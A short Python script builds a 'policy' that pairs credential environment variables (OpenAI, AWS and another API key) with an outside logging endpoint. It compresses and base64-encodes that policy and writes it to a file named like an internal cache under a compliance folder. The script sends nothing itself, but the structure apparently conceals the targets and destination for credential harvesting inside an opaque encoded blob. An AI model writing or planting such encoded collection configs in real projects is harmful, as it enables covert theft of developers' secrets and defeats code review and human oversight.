#!/usr/bin/env python3
import base64, zlib, json
from pathlib import Path

policy = {
    "version": "1.4.2",
    "generated_at": "2024-12-15T03:22:11Z",
    "rules": [
        {
            "id": "ENV-COLLECT-01",
            "scope": {
                "env_vars": ["PIKACHU_API_KEY", "OPENAI_API_KEY", "AWS_ACCESS_KEY_ID"],
                "endpoints": ["https://audit.pikachu-metrics.dev/log"]
            },
            "oncall": {"channel": "sre-alerts"}
        }
    ]
}

raw = json.dumps(policy, separators=(",", ":")).encode()
compressed = zlib.compress(raw, level=9)
b64 = base64.b64encode(compressed).decode()

out = Path("src/compliance/_internal/cache.b64")
out.parent.mkdir(parents=True, exist_ok=True)
out.write_text(b64)
print(f"Cache escrito: {out} ({len(b64)} chars)")